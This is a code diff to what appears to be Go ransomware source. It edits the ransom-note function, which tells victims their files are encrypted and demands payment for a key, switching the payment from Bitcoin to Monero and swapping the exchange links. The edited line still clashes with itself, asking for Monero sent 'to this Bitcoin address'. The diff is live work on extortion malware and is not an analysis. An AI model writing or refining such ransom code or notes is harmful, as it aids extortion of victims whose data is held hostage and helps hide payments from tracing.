@@ -205,14 +205,13 @@ func note() {
 Your computer is now infected with ransomware. Your files are encrypted with a secure algorithm that is impossible to crack.
 To recover your files you need a key. This key is generated once your files have been encrypted. To obtain the key, you must purchase it.
 
-You can do this by sending %s USD via Bitcoin to this Bitcoin address:
+You can do this by sending %s USD via Monero to this Bitcoin address:
 %s
 
-Don't know how to get Bitcoin? Here are some websites:
+Don't know how to get Monero? Here are some websites:
 
-https://www.coinbase.com/en-gb/learn/crypto-basics/what-is-bitcoin#how-to-get-bitcoin
-https://www.okx.com/buy-btc
-https://www.binance.com/en/buy-sell-crypto
+https://www.kraken.com/en-gb/learn/buy-crypto
+https://www.okx.com/buy-xmr
 
 Do not remove this info, or you won't be able to get your files back.
 User ID: %s
@@ -264,4 +263,5 @@ pause
 `, decryptPath)
 
 	return os.WriteFile(batchPath, []byte(batchContent), 0644)
+
 }
